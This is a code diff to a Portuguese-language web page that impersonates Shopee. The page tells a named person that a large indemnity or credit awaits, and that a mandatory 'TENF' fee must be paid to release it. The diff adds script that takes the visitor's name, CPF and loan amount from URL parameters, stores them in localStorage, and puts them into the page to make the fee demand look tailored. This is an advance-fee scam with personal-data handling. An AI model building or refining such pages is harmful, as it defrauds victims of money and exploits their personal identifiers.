@@ -256,7 +256,7 @@
           <!-- Card de Valor Aprovado -->
           <div class="bg-gray-50 rounded-xl p-4 text-center mb-6 card">
             <p class="text-gray-700 font-medium mb-2">Indenização disponível</p>
-            <p class="text-3xl font-bold text-shopee">R$ 7.854,63</p>
+            <p id="valor-indenizacao" class="text-3xl font-bold text-shopee">R$ 7.854,63</p>
           </div>
 
           <!-- Alert -->
@@ -266,7 +266,7 @@
                 <i class="fas fa-exclamation-triangle text-white"></i>
               </div>
               <p class="text-sm">
-                Atenção! <strong class="nome-usuario">Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar sua indenização
+                Atenção! <strong class="nome-usuario">Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar seu crédito
               </p>
             </div>
           </div>
@@ -319,7 +319,7 @@
               </div>
               <div class="comprovante-item">
                 <span class="text-gray-600">Valor da Indenização</span>
-                <span class="text-gray-800 font-medium">R$ 7.854,63</span>
+                <span id="valor-indenizacao-comprovante" class="text-gray-800 font-medium">R$ 9.854,63</span>
               </div>
               <div class="comprovante-item">
                 <span class="text-gray-600">Taxa TENF</span>
@@ -335,7 +335,7 @@
                 Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
                 O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
                 a transferência será feita para sua chave PIX cadastrada. 
-                Caso não conclua o pagamento, sua indenização será bloqueada.
+                Caso não conclua o pagamento, seu crédito será bloqueada.
               </p>
             </div>
           </div>
@@ -350,16 +350,105 @@
 
   <script>
     const params = new URLSearchParams(window.location.search)
-    const nomeCompleto = params.get("name") || "Nome não informado"
-    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+    
+    // Função para salvar dados importantes no localStorage
+    function salvarDadosLocalStorage(nome, cpf, valorEmprestimo) {
+      if (nome && nome.trim() !== "") {
+        localStorage.setItem("userNome", nome);
+      }
+      if (cpf && cpf.trim() !== "") {
+        localStorage.setItem("userCpf", cpf);
+      }
+      if (valorEmprestimo && valorEmprestimo.trim() !== "") {
+        localStorage.setItem("userValorEmprestimo", valorEmprestimo);
+      }
+    }
 
-    // Atualizar elementos com nome do usuário
+    // Função para recuperar dados do localStorage
+    function recuperarDadosLocalStorage() {
+      return {
+        nome: localStorage.getItem("userNome") || "",
+        cpf: localStorage.getItem("userCpf") || "",
+        valorEmprestimo: localStorage.getItem("userValorEmprestimo") || ""
+      };
+    }
+    
+    // Capturar dados com fallback para localStorage
+    let nomeCompleto = params.get("name") || params.get("nome") || "";
+    let cpf = params.get("cpf") || params.get("document") || "";
+    let valorEmprestimo = params.get("valor_emprestimo") || params.get("valor_aprovado") || "";
+    
+    // Se algum dado estiver vazio, tentar recuperar do localStorage
+    const dadosLocalStorage = recuperarDadosLocalStorage();
+    
+    if (!nomeCompleto || nomeCompleto.trim() === "") {
+      nomeCompleto = dadosLocalStorage.nome;
+      console.log("Nome recuperado do localStorage:", nomeCompleto);
+    }
+    
+    // Se ainda não tiver nome válido, usar valor padrão
+    if (!nomeCompleto || nomeCompleto.trim() === "") {
+      nomeCompleto = "Nome não informado";
+    }
+    
+    if (!cpf || cpf.trim() === "") {
+      cpf = dadosLocalStorage.cpf;
+      console.log("CPF recuperado do localStorage:", cpf);
+    }
+    
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = dadosLocalStorage.valorEmprestimo;
+      console.log("Valor do empréstimo recuperado do localStorage:", valorEmprestimo);
+    }
+    
+    // Salvar dados atuais no localStorage para uso futuro
+    salvarDadosLocalStorage(nomeCompleto, cpf, valorEmprestimo);
+    
+    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+    
+    // Capturar o valor do empréstimo solicitado pelo usuário (já declarado acima)
+    // Usar valor padrão se não encontrar nenhum valor
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = "7854.63";
+    }
+    
+    // Função para formatar valor monetário
+    function formatarValor(valor) {
+      const numero = parseFloat(valor);
+      return numero.toLocaleString('pt-BR', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
+
+    // Atualizar elementos com nome do usuário e valor do empréstimo
     document.addEventListener('DOMContentLoaded', function() {
       document.querySelector(".user-name").textContent = `Olá, ${primeiroNome}`
       const nomeElements = document.querySelectorAll(".nome-usuario")
       nomeElements.forEach(element => {
         element.textContent = nomeCompleto
       })
+      
+      // Atualizar o valor da indenização com base no valor do empréstimo
+      const valorIndenizacao = document.getElementById("valor-indenizacao");
+      if (valorIndenizacao) {
+        valorIndenizacao.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
+      }
+      
+      // Também atualizar no comprovante
+      const valorIndenizacaoComprovante = document.getElementById("valor-indenizacao-comprovante");
+      if (valorIndenizacaoComprovante) {
+        valorIndenizacaoComprovante.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
+      }
+      
+      console.log('Valor do empréstimo recebido:', valorEmprestimo);
+      console.log('Nome do usuário:', nomeCompleto);
+      console.log('Dados do localStorage:', dadosLocalStorage);
+      console.log('Fonte dos dados:', {
+        fonteNome: params.get("name") || params.get("nome") ? "URL" : "localStorage",
+        fonteCpf: params.get("cpf") || params.get("document") ? "URL" : "localStorage",
+        fonteValor: params.get("valor_emprestimo") || params.get("valor_aprovado") ? "URL" : "localStorage"
+      });
     })
 
     function calcularTaxa() {
